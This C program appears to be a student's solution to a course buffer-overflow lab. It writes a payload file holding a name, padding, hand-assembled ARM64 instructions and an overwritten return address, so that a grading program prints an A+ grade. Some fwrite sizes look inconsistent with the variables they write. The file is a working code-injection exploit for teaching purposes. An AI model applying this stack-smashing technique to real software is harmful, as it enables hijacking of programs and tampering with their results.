#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void)
{
    const char* name = "Tansha";
    int i;
    unsigned long ulReturnAddress = 0x420064;

    /* putchar('A') */
    /* unsigned int uiAdrInstr1 = MiniAssembler_adr(0, 0x400938, 0x42006C); */
    /* unsigned int uiMovInstr1 = MiniAssembler_mov(0, 0x41); */ /* 24-27 */
    /* unsigned int uiBlInstr1 = MiniAssembler_bl(0x400490, 0x420070); */ /* 28-31 */
    /* unsigned int uiBlInstr1 = MiniAssembler_bl(0x400600, 0x420070); */ /* 28-31 */
    

    /* Testing how to use printf by printing stuff from RODATA */
    /* Basic idea is we will write %c NULLBYTE at the end of this file.
    We will know the place in memory so we can put the address in x0, and then char A in x1,
    and we can call printf. 
    Only problem is that printf is segfaulting. */


    /* adrp	x0, 0x400000 */
    unsigned int uiAdrpInstr1 = MiniAssembler_adrp(0, 0x400000, 0x420064); /* 1 */
    /* add	x0, x0, #0x978 */
    unsigned int uiAddInstr1 = MiniAssembler_add(0, 0, 0x978); /* 2 */
    /* adrp	x1, 0x420000*/
    unsigned int uiAdrpInstr2 = MiniAssembler_adrp(1, 0x420000, 0x42006C); /* 3 */
    /* add	x1, x1, #0x58 */
    unsigned int uiAddInstr2 = MiniAssembler_add(1, 1, 0x58);/* 4 */
    /* bl	0x400600 <printf@plt> */
    unsigned int uiBlInstr1 = MiniAssembler_bl(0x400600, 0x420074);/* 5 */
    
    /* grade = + */
    unsigned int uiMovInstr1 = MiniAssembler_mov(1, 0x002B); /* 6 */
    unsigned int uiAdrInstr1 = MiniAssembler_adr(2, 0x420044, 0x42007C); /* 7 */
    unsigned int uiStrbInstr1 = MiniAssembler_strb(1, 2); /* 8 */
    
    /* Branch to printf("%c is your grade.\n", grade); */
    unsigned int uiBInstr1 = MiniAssembler_b(0x400864, 0x420084); /* 9 */

    FILE *psFile;

    psFile = fopen("dataAplus", "w");

    /* Printing out 6-character long name. */
    /* 0->5 */
    fprintf(psFile, "%s", name);
    /* 0x420058 -> 0x42005E */
    
    /* 6->12 */
    for (i = 0; i < 9; i++)
    {
        putc('\0', psFile); /* Writes 00000000 */
    }

    fwrite(&uiAdrpInstr1, sizeof(unsigned int), 1, psFile);
    fwrite(&uiAddInstr1, sizeof(unsigned int), 1, psFile);
    fwrite(&uiAdrpInstr2, sizeof(unsigned int), 1, psFile);
    fwrite(&uiAddInstr2, sizeof(unsigned int), 1, psFile);
    fwrite(&uiBlInstr1, sizeof(unsigned int), 1, psFile);


    fwrite(&uiMovInstr1, sizeof(unsigned int), 1, psFile);
    fwrite(&uiAdrInstr1, sizeof(unsigned long), 1, psFile);
    fwrite(&uiStrbInstr1, sizeof(unsigned int), 1, psFile);

    fwrite(&uiBInstr1, sizeof(unsigned long), 1, psFile);

    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 1;
}


